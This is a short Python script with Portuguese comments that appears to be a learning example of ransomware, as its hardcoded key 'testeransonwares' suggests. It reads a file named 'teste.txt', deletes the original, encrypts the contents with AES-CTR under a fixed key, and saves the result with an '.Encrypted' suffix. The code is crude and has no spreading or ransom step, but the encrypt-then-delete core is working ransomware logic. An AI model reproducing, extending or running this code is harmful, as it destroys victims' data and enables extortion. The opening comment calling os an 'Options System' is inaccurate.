'''
    OS - Options System
    PYAES - Keys Encrypt/Decrypt
'''
import os
import pyaes

    ##abrir o arquivo a ser criptografado
fName = 'teste.txt'
file = open(fName, 'rb')
fileData = file.read()
file.close()

    ##remove arquivo original;
os.remove(fName)

    ##defini chave;
key = b"testeransonwares"
aes = pyaes.AESModeOfOperationCTR(key)

    ##Criptgrafar arquivo
encryptData = aes.encrypt(fileData)

    ##SalvarArquivoCriptografado
nwFile = fName + ".Encrypted"
nwFile = open(f'{nwFile}', 'wb')
nwFile.write(encryptData)
nwFile.close()